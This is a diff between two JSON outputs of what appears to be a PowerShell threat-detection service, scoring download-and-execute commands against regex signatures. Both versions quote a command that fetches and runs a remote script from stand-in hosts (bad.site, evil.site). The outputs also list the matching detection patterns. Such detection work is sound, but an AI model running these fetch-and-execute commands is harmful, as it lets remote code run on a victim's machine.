@@ -1,48 +1,17 @@
 {
-  "line_number": 3,
-  "command": "IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload1.ps1')",
+  "line_number": 4,
+  "command": "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.site/a.ps1')",
   "request_payload": {
-    "command": "IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload1.ps1')"
+    "command": "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.site/a.ps1')"
   },
   "status_code": 200,
   "response": {
     "success": true,
     "analysis": {
-      "command": "IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload1.ps1')",
-      "risk_score": 40.5,
+      "command": "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.site/a.ps1')",
+      "risk_score": 35.5,
       "severity": "critical",
       "signatures": [
-        {
-          "name": "Notable Invoke-Expression",
-          "severity": "critical",
-          "score": 10.0,
-          "base_score": 10.0,
-          "total_score": 10.0,
-          "matches_found": 1,
-          "max_match_allowed": 1,
-          "matches_details": [
-            {
-              "position": {
-                "end": 4,
-                "start": 0
-              },
-              "matched_in": "original",
-              "match_number": 1,
-              "matched_text": "IEX("
-            }
-          ],
-          "pattern": "\\b(iex|Invoke[-]Expression)\\s+2>&1|\\biex\\s*\\(|\\.\\s*'*iex'*|\\biex\\s*\\(\\s*irm\\b|iex\\s*\\(\\s*&\\s*\\(",
-          "tactics": [
-            "TA0005"
-          ],
-          "techniques": [
-            "T1059.001",
-            "T1027"
-          ],
-          "description": "Detects PowerShell code patterns commonly associated with dynamic command execution and basic obfuscation of Invoke-Expression (iex). This might match on legitimate cases. So consider fine-tuning the score/regex to your needs.",
-          "link": "https://github.com/avasero/psexposed/blob/main/indicators/ps_indicator_notable_invoke_expression.yaml",
-          "indicator_type": "community"
-        },
         {
           "name": "Highly suspicious keywords",
           "severity": "high",
@@ -54,8 +23,8 @@
           "matches_details": [
             {
               "position": {
-                "end": 42,
-                "start": 28
+                "end": 57,
+                "start": 43
               },
               "matched_in": "original",
               "match_number": 1,
@@ -84,12 +53,12 @@
           "matches_details": [
             {
               "position": {
-                "end": 70,
-                "start": 42
+                "end": 79,
+                "start": 57
               },
               "matched_in": "original",
               "match_number": 1,
-              "matched_text": "http://bad.site/payload1.ps1"
+              "matched_text": "http://evil.site/a.ps1"
             }
           ],
           "pattern": "https*://\\S+\\.\\S+/\\S+\\.(ps1|psm1)",
@@ -114,8 +83,8 @@
           "matches_details": [
             {
               "position": {
-                "end": 27,
-                "start": 17
+                "end": 42,
+                "start": 32
               },
               "matched_in": "original",
               "match_number": 1,
@@ -145,8 +114,8 @@
           "matches_details": [
             {
               "position": {
-                "end": 49,
-                "start": 42
+                "end": 64,
+                "start": 57
               },
               "matched_in": "original",
               "match_number": 1,
@@ -164,33 +133,61 @@
           "description": "Highlights commands containing a potential URL by matching against an HTTP/S reference. Consider filtering out URLs containing private/known addresses.",
           "link": "https://github.com/avasero/psexposed/blob/main/indicators/ps_indicator_https_usage.yaml",
           "indicator_type": "community"
+        },
+        {
+          "name": "Invoke-Expression cmdlet",
+          "severity": "medium",
+          "score": 5.0,
+          "base_score": 5.0,
+          "total_score": 5.0,
+          "matches_found": 1,
+          "max_match_allowed": 1,
+          "matches_details": [
+            {
+              "position": {
+                "end": 17,
+                "start": 0
+              },
+              "matched_in": "original",
+              "match_number": 1,
+              "matched_text": "Invoke-Expression"
+            }
+          ],
+          "pattern": "Invoke-Expression|\\biex\\b",
+          "tactics": [
+            "TA0002"
+          ],
+          "techniques": [
+            "T1059.001"
+          ],
+          "description": "Spots potential use of Invoke-Expression cmdlet and its alias.",
+          "link": "https://github.com/avasero/psexposed/blob/main/indicators/ps_indicator_invoke_expression_cmdlet.yaml",
+          "indicator_type": "community"
         }
       ],
       "tactics": [
         "TA0002",
-        "TA0011",
-        "TA0005"
+        "TA0011"
       ],
       "techniques": [
-        "T1027",
+        "T1105",
         "T1059.001",
-        "T1071.001",
-        "T1105"
+        "T1071.001"
       ],
       "decoded_command": null,
       "double_decoded_command": null
     },
-    "analysis_id": "n4bdfwvl",
+    "analysis_id": "q5shi6tq",
     "session_id": "3013961b-7bc7-406a-b3b3-ac58d7c41351",
     "decode_info": {
-      "current_usage": 2,
+      "current_usage": 3,
       "limit": 5,
       "is_example": false,
       "decode_used_this_request": false
     },
     "rate_limit_info": {
       "within_limit": true,
-      "current_count": 2,
+      "current_count": 3,
       "limit": 10
     }
   }
